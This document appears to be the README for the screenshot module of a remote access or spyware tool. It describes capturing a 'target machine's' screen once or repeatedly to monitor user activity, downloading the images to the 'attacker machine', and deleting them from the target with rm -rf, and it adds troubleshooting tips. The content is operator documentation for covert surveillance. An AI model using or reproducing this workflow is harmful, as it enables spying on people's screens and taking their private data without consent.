# Screenshots Directory

This directory stores screenshot images captured from the target machine's screen.

## File Information

### File Naming Convention

- **Format:** `screenshot_YYYYMMDD_HHMMSS.png`
- **Example:** `screenshot_20251004_143022.png`
- **Location:** `logs/screenshots/`

### File Format

- **Type:** PNG (Portable Network Graphics)
- **Quality:** Lossless compression
- **Color:** Full RGB color
- **Resolution:** Matches target's screen resolution

## Commands

### Single Screenshot

```bash
screenshot
```

Captures a single screenshot immediately.

**Output:**

```
Screenshot saved: logs/screenshots/screenshot_20251004_143022.png
```

### Multiple Screenshots

```bash
screenshot_multi <count> <interval>
```

**Parameters:**

- `count` - Number of screenshots to capture (default: 5)
- `interval` - Seconds between captures (default: 2)

**Example:**

```bash
screenshot_multi 10 5
```

Captures 10 screenshots, 5 seconds apart.

**Output:**

```
Screenshot saved: logs/screenshots/screenshot_1_20251004_143022.png
Screenshot saved: logs/screenshots/screenshot_2_20251004_143027.png
Screenshot saved: logs/screenshots/screenshot_3_20251004_143032.png
...
```

### List Screenshots

```bash
screenshot_list
```

Lists all captured screenshots with filenames.

### Download Screenshots

```bash
download logs/screenshots/screenshot_20251004_143022.png
```

Downloads specific screenshot to attacker machine.

## Screenshot Methods

The module uses multiple methods for maximum compatibility:

### 1. PIL/Pillow (Primary Method)

- **Library:** Pillow (PIL)
- **Compatibility:** Windows, macOS, Linux
- **Quality:** High
- **Speed:** Fast

### 2. PyAutoGUI (Fallback)

- **Library:** pyautogui
- **Compatibility:** Cross-platform
- **Quality:** High
- **Speed:** Fast

### 3. System Commands (Final Fallback)

Different commands based on OS:

**macOS:**

```bash
screencapture -x <filename>
```

**Linux:**

```bash
scrot <filename>
# or
import -window root <filename>
# or
gnome-screenshot -f <filename>
```

**Windows:**

```powershell
# PowerShell screenshot method
# Uses System.Drawing libraries
```

## File Size

Typical screenshot sizes (varies by resolution):

| Resolution          | Approximate Size |
| ------------------- | ---------------- |
| 1920x1080 (Full HD) | 1-3 MB           |
| 1366x768 (HD)       | 500 KB - 1.5 MB  |
| 2560x1440 (2K)      | 2-5 MB           |
| 3840x2160 (4K)      | 5-10 MB          |

**Note:** PNG files are lossless, so size depends on screen content complexity.

## Storage Considerations

### Disk Space Management

**Example calculations:**

- 10 screenshots (1080p): ~20-30 MB
- 100 screenshots (1080p): ~200-300 MB
- 1000 screenshots (1080p): ~2-3 GB

**Recommendation:** Regularly download and clear screenshots to manage disk space.

## Usage Examples

### Quick Surveillance

```bash
# Capture current screen
screenshot
```

### Monitoring User Activity

```bash
# Capture 20 screenshots over 100 seconds
screenshot_multi 20 5
```

### Periodic Monitoring

```bash
# Take screenshot every 60 seconds (run multiple times)
screenshot
# Wait 60 seconds
screenshot
# Repeat...
```

### Download All Screenshots

```bash
# List all screenshots
screenshot_list

# Download each one
download logs/screenshots/screenshot_20251004_143022.png
download logs/screenshots/screenshot_20251004_143027.png
# etc...
```

## Cleanup

### Remove All Screenshots

```bash
# On target machine (if you have shell access)
rm -rf logs/screenshots/*

# Keep directory structure
rm logs/screenshots/*.png
```

### Remove Old Screenshots

```bash
# Linux/macOS - Remove screenshots older than 7 days
find logs/screenshots/ -name "*.png" -mtime +7 -delete

# Remove screenshots older than 24 hours
find logs/screenshots/ -name "*.png" -mtime +1 -delete
```

## Troubleshooting

### Issue: "Screen capture feature not available"

**Solutions:**

1. Install Pillow: `pip install Pillow`
2. Or install pyautogui: `pip install pyautogui`
3. Or use system commands (automatic fallback)

### Issue: Black screenshots

**Causes:**

- Screen saver active
- Display locked
- Multiple monitors (capturing wrong screen)
- Permission issues

**Solutions:**

- Ensure screen is unlocked
- Check display permissions (macOS Security & Privacy)
- Use system-specific capture tools

### Issue: Permission denied

**Solutions:**

- Create logs directory: `mkdir -p logs/screenshots`
- Check write permissions: `chmod 755 logs/screenshots`
- Run with appropriate permissions

### Issue: Large file sizes

**Solutions:**

- Files are PNG (lossless) - this is expected
- Convert to JPEG for smaller size: `convert file.png file.jpg`
- Use lower screen resolution on target

## Screenshot Quality

### Advantages of PNG Format

✅ Lossless quality
✅ Supports transparency
✅ Good for text/screenshots
✅ No compression artifacts
✅ Professional quality
